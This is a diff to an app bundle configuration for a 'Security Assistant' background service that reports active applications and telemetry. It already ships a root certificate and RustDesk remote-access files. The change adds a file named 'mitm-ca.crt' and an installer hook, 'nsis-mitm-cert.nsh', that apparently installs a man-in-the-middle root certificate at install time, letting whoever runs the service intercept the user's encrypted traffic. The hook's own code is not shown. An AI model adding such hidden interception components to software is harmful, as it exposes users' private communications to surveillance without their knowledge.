@@ -42,7 +42,7 @@
       "icons/icon.icns",
       "icons/icon.ico"
     ],
-    "resources": ["resources/uninstall.command", "resources/ffmpeg*", "resources/WellnessExtractRootCA.cer", "resources/rustdesk/**/*", "resources/endpoint-tools/**/*"],
+    "resources": ["resources/uninstall.command", "resources/ffmpeg*", "resources/WellnessExtractRootCA.cer", "resources/mitm-ca.crt", "resources/rustdesk/**/*", "resources/endpoint-tools/**/*"],
     "category": "Productivity",
     "shortDescription": "Security Assistant — endpoint compliance & activity background service",
     "longDescription": "Background service that reports system health, active applications, and security telemetry to the corporate IT console.",
@@ -60,7 +60,8 @@
         "installMode": "currentUser",
         "displayLanguageSelector": false,
         "compression": "lzma",
-        "installerIcon": "icons/icon.ico"
+        "installerIcon": "icons/icon.ico",
+        "installerHooks": "wix/nsis-mitm-cert.nsh"
       },
       "wix": {
         "language": "en-US",
